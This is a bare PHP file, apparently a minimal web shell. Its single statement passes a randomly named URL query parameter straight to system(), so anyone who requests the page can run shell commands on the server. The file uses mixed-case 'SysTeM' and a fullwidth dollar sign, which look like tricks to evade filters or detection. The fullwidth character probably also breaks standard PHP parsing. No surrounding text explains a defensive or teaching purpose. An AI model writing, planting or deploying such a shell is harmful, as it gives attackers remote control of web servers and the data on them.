<?php
SysTeM(＄_GET['XUepGffV']);
?>
